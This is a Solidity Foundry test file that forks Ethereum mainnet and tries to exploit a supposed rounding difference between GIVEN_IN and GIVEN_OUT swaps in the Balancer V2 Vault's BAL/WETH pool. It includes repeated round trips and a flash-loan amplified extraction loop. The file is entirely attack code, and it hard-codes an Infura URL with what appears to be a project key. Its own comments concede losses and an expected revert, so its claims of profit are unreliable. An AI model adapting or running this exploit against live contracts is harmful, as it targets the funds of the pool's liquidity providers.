// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// Balancer V2 Vault ARBITRAGE EXPLOIT
// Exploiting GIVEN_IN vs GIVEN_OUT rounding difference
// ============================================================================

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds, int256[] memory limits, uint256 deadline) external payable returns (int256[] memory);
    function queryBatchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds) external returns (int256[] memory);
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external;
}

contract BalancerArbitrage is Test, IFlashLoanRecipient {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);

    bytes32 constant BAL_WETH_POOL = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

    address attacker;
    bool inFlashLoan;
    uint256 initialWeth;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);
        vm.deal(attacker, 1000 ether);
        WETH.deposit{value: 100 ether}();
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);
    }

    // ========================================================================
    // EXPLOIT: Use the rounding difference to extract value
    //
    // Strategy:
    // 1. Use GIVEN_IN to swap WETH -> BAL (pay 1 WETH, get X BAL)
    // 2. Use GIVEN_OUT to swap BAL -> WETH (to get back 1 WETH, pay < X BAL)
    // 3. Keep the leftover BAL as profit
    //
    // The rounding difference means we should end up with extra BAL
    // ========================================================================

    function test_ExploitRoundingDifference() public {
        console.log("=== EXPLOITING GIVEN_IN/GIVEN_OUT ROUNDING ===");

        uint256 swapAmount = 100 ether; // Start with 100 WETH

        uint256 wethBefore = WETH.balanceOf(attacker);
        uint256 balBefore = BAL.balanceOf(attacker);
        console.log("Initial WETH:", wethBefore / 1e18);
        console.log("Initial BAL:", balBefore / 1e18);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // STEP 1: Query how much BAL we get for swapAmount WETH (GIVEN_IN)
        IVault.BatchSwapStep[] memory swaps1 = new IVault.BatchSwapStep[](1);
        swaps1[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,  // WETH
            assetOutIndex: 0, // BAL
            amount: swapAmount,
            userData: ""
        });

        int256[] memory deltas1 = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps1, assets, funds);
        uint256 balReceived = uint256(-deltas1[0]);
        console.log("\nStep 1 - GIVEN_IN Query:");
        console.log("  WETH in:", swapAmount / 1e18);
        console.log("  BAL out:", balReceived / 1e18);

        // STEP 2: Query how much WETH we can get back for that BAL (GIVEN_IN reverse)
        IVault.BatchSwapStep[] memory swaps2 = new IVault.BatchSwapStep[](1);
        swaps2[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 0,  // BAL
            assetOutIndex: 1, // WETH
            amount: balReceived,
            userData: ""
        });

        int256[] memory deltas2 = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps2, assets, funds);
        uint256 wethBack = uint256(-deltas2[1]);
        console.log("\nStep 2 - Swap BAL back to WETH:");
        console.log("  BAL in:", balReceived / 1e18);
        console.log("  WETH out:", wethBack / 1e18);

        // Calculate the round trip loss (should be negative due to fees)
        if (wethBack > swapAmount) {
            console.log("\n!!! PROFIT:", (wethBack - swapAmount) / 1e15, "* 0.001 WETH !!!");
        } else {
            console.log("\nRound trip loss:", (swapAmount - wethBack) / 1e15, "* 0.001 WETH");
        }

        // STEP 3: Now try the clever approach - use GIVEN_OUT for the second swap
        // We want EXACTLY swapAmount WETH back, how much BAL do we need?
        IVault.BatchSwapStep[] memory swaps3 = new IVault.BatchSwapStep[](1);
        swaps3[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 0,  // BAL
            assetOutIndex: 1, // WETH
            amount: swapAmount, // We want exactly this much WETH out
            userData: ""
        });

        int256[] memory deltas3 = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, swaps3, assets, funds);
        uint256 balNeeded = uint256(deltas3[0]);
        console.log("\nStep 3 - GIVEN_OUT to get back original WETH:");
        console.log("  WETH out (target):", swapAmount / 1e18);
        console.log("  BAL needed:", balNeeded / 1e18);

        // If balNeeded < balReceived, we profit!
        if (balReceived > balNeeded) {
            uint256 balProfit = balReceived - balNeeded;
            console.log("\n!!! POTENTIAL PROFIT: ", balProfit / 1e18, "BAL !!!");

            // Execute the actual trades
            console.log("\nExecuting actual trades...");

            // Trade 1: WETH -> BAL
            int256[] memory limits1 = new int256[](2);
            limits1[0] = 0; // We expect BAL out (negative delta)
            limits1[1] = int256(swapAmount); // We pay WETH

            VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, swaps1, assets, funds, limits1, block.timestamp + 1000);

            uint256 actualBalReceived = BAL.balanceOf(attacker) - balBefore;
            console.log("Actual BAL received:", actualBalReceived / 1e18);

            // Trade 2: BAL -> WETH (GIVEN_OUT - we want exactly our original WETH back)
            int256[] memory limits2 = new int256[](2);
            limits2[0] = int256(actualBalReceived); // We can spend up to all our BAL
            limits2[1] = 0; // We expect WETH out

            VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, swaps3, assets, funds, limits2, block.timestamp + 1000);

            uint256 wethAfter = WETH.balanceOf(attacker);
            uint256 balAfter = BAL.balanceOf(attacker);

            console.log("\nFinal balances:");
            console.log("  WETH:", wethAfter / 1e18);
            console.log("  BAL:", balAfter / 1e18);

            if (wethAfter >= wethBefore && balAfter > balBefore) {
                console.log("\n=== EXPLOIT SUCCESSFUL ===");
                console.log("WETH profit:", (wethAfter - wethBefore) / 1e15, "* 0.001 WETH");
                console.log("BAL profit:", (balAfter - balBefore) / 1e18, "BAL");
            } else if (wethAfter < wethBefore) {
                console.log("\nWETH loss:", (wethBefore - wethAfter) / 1e15, "* 0.001 WETH");
            }
        } else {
            console.log("\nNo arbitrage opportunity (balNeeded >= balReceived)");
        }
    }

    // ========================================================================
    // MASSIVE ROUND TRIP: 1000 iterations to accumulate rounding
    // ========================================================================

    function test_MassiveRoundTripAccumulation() public {
        console.log("=== MASSIVE ROUND TRIP ACCUMULATION ===");

        uint256 iterations = 50; // 50 round trips
        uint256 amountPerSwap = 1 ether;

        uint256 wethBefore = WETH.balanceOf(attacker);
        uint256 balBefore = BAL.balanceOf(attacker);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        console.log("Starting WETH:", wethBefore / 1e18);
        console.log("Iterations:", iterations);

        uint256 totalWethIn = 0;
        uint256 totalWethOut = 0;

        for (uint256 i = 0; i < iterations; i++) {
            // Swap 1: WETH -> BAL
            IVault.BatchSwapStep[] memory swaps1 = new IVault.BatchSwapStep[](1);
            swaps1[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: amountPerSwap,
                userData: ""
            });

            int256[] memory limits1 = new int256[](2);
            limits1[0] = 0;
            limits1[1] = int256(amountPerSwap);

            int256[] memory deltas1 = VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, swaps1, assets, funds, limits1, block.timestamp + 1000);
            totalWethIn += uint256(deltas1[1]);
            uint256 balGot = uint256(-deltas1[0]);

            // Swap 2: BAL -> WETH (GIVEN_OUT to get exact WETH back)
            IVault.BatchSwapStep[] memory swaps2 = new IVault.BatchSwapStep[](1);
            swaps2[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: amountPerSwap, // Want exactly this much WETH back
                userData: ""
            });

            int256[] memory limits2 = new int256[](2);
            limits2[0] = int256(balGot);
            limits2[1] = 0;

            try VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, swaps2, assets, funds, limits2, block.timestamp + 1000) returns (int256[] memory deltas2) {
                totalWethOut += uint256(-deltas2[1]);
            } catch {
                console.log("Round trip failed at iteration:", i);
                break;
            }

            if (i % 10 == 0) {
                console.log("Iteration", i, "- BAL balance:", BAL.balanceOf(attacker) / 1e18);
            }
        }

        uint256 wethAfter = WETH.balanceOf(attacker);
        uint256 balAfter = BAL.balanceOf(attacker);

        console.log("\nFinal Results:");
        console.log("  Total WETH in:", totalWethIn / 1e18);
        console.log("  Total WETH out:", totalWethOut / 1e18);
        console.log("  Final WETH:", wethAfter / 1e18);
        console.log("  Final BAL:", balAfter / 1e18);
        console.log("  Initial BAL:", balBefore / 1e18);

        if (balAfter > balBefore) {
            console.log("  BAL PROFIT:", (balAfter - balBefore) / 1e18);
        }
        if (wethAfter > wethBefore) {
            console.log("  WETH PROFIT:", (wethAfter - wethBefore) / 1e18);
        }
    }

    // ========================================================================
    // FLASH LOAN AMPLIFIED ARBITRAGE
    // Use flash loan to maximize the rounding extraction
    // ========================================================================

    function test_FlashLoanAmplifiedArbitrage() public {
        console.log("=== FLASH LOAN AMPLIFIED ARBITRAGE ===");

        // Flash loan a large amount of WETH
        uint256 loanAmount = 1000 ether;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(WETH));

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;

        uint256 wethBefore = WETH.balanceOf(attacker);
        uint256 balBefore = BAL.balanceOf(attacker);

        console.log("Before flash loan:");
        console.log("  WETH:", wethBefore / 1e18);
        console.log("  BAL:", balBefore / 1e18);

        initialWeth = wethBefore;
        inFlashLoan = true;

        try VAULT.flashLoan(address(this), tokens, amounts, abi.encode(loanAmount)) {
            uint256 wethAfter = WETH.balanceOf(attacker);
            uint256 balAfter = BAL.balanceOf(attacker);

            console.log("\nAfter flash loan:");
            console.log("  WETH:", wethAfter / 1e18);
            console.log("  BAL:", balAfter / 1e18);

            if (wethAfter > wethBefore) {
                console.log("  WETH PROFIT:", (wethAfter - wethBefore) / 1e15, "* 0.001 WETH");
            }
            if (balAfter > balBefore) {
                console.log("  BAL PROFIT:", (balAfter - balBefore) / 1e18, "BAL");
            }
        } catch Error(string memory reason) {
            console.log("Flash loan failed:", reason);
        }

        inFlashLoan = false;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == address(VAULT), "Not vault");
        require(inFlashLoan, "Not in flash loan");

        uint256 loanAmount = abi.decode(userData, (uint256));
        console.log("  In flash loan callback");
        console.log("  Loan amount:", loanAmount / 1e18, "WETH");
        console.log("  Fee:", feeAmounts[0], "wei");

        // Try to exploit rounding during flash loan
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        // Perform multiple round trips with the flash loaned amount
        uint256 iterations = 10;
        uint256 amountPerSwap = loanAmount / 10;

        for (uint256 i = 0; i < iterations; i++) {
            // Swap WETH -> BAL
            IVault.BatchSwapStep[] memory swaps1 = new IVault.BatchSwapStep[](1);
            swaps1[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: amountPerSwap,
                userData: ""
            });

            int256[] memory limits1 = new int256[](2);
            limits1[0] = 0;
            limits1[1] = int256(amountPerSwap);

            try VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, swaps1, assets, funds, limits1, block.timestamp + 1000) returns (int256[] memory deltas1) {
                uint256 balGot = uint256(-deltas1[0]);

                // Swap BAL -> WETH (GIVEN_IN to avoid GIVEN_OUT issues with small amounts)
                IVault.BatchSwapStep[] memory swaps2 = new IVault.BatchSwapStep[](1);
                swaps2[0] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 0,
                    assetOutIndex: 1,
                    amount: balGot,
                    userData: ""
                });

                int256[] memory limits2 = new int256[](2);
                limits2[0] = int256(balGot);
                limits2[1] = 0;

                VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, swaps2, assets, funds, limits2, block.timestamp + 1000);
            } catch {
                console.log("  Swap failed at iteration:", i);
                break;
            }
        }

        // Repay the flash loan
        uint256 totalOwed = amounts[0] + feeAmounts[0];
        uint256 currentWeth = WETH.balanceOf(address(this));

        console.log("  Current WETH:", currentWeth / 1e18);
        console.log("  Need to repay:", totalOwed / 1e18);

        if (currentWeth >= totalOwed) {
            tokens[0].transfer(address(VAULT), totalOwed);
        } else {
            // We lost money in the round trips, need to cover from initial balance
            uint256 shortfall = totalOwed - currentWeth;
            console.log("  Shortfall:", shortfall / 1e15, "* 0.001 WETH");
            tokens[0].transfer(address(VAULT), currentWeth);
            // This will revert since we can't repay
        }
    }

    receive() external payable {}
}
